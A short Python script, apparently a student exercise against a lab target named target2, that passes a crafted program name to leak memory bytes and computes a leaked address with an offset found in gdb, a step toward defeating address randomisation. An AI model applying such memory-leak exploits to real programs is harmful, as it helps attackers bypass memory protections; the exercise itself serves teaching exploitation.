#!/usr/bin/python3

import  subprocess

target  = '../targets/target2'
argv    = [ './target2 ' ] # make sure to leave a space at the end to overwrite '\0'

# Save the output of target2 to a variable
result = subprocess.run(argv, executable=target, stdout=subprocess.PIPE)
# get the last 4 bytes of the output (leave out the newline character)
leaked_bytes = result.stdout[-5:-1]
# calculated offset (leaked_bytes - address found in gdb)
offset = 0x2A
# calculate the address of the leaked variable
leaked_address = int.from_bytes(leaked_bytes, "little") - offset
# print the address in the format 0xXXXXXXXX
print("0x%016x" % leaked_address) # should print 0x56820e96